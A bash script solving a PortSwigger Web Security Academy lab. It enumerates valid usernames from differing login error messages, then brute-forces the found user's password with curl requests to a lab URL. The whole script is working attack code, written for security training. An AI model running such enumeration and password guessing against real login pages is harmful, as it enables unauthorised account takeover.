#!/bin/bash

<<comment
Date: 15/12/2022
Website: https://portswigger.net
Lab: Username enumeration via different responses
comment

echo "[!] Attempting to enumerate user based on different response..."
while read -r line
do
    response=$(curl -i -s -X POST "https://0a40001e04288ab5c20c62b000a700fc.web-security-academy.net/login" -d "username=$line&password=gg" |grep -Eio "Invalid username")
    
    if [[ -z "$response" ]]
    then
        echo "[+] Username found: ${line}"
        user="$line"
    fi
done < usernames.txt

echo "[!] Attempting to bruteforce user password..."
while read -r line
do
    response=$(curl -i -s -X POST "https://0a40001e04288ab5c20c62b000a700fc.web-security-academy.net/login" -d "username=${user}&password=${line}" |awk -F " " '{print $2;exit}')
    
    if [[ "$response" -eq 302 ]]
    then
        echo "[+] Password found: ${line}"
    fi
done < passwords.txt